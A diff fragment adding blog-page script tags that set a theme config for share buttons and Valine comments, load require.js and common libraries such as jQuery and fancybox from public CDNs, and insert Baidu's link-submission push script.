+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"\",\"API_KEY\":\"\"},\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
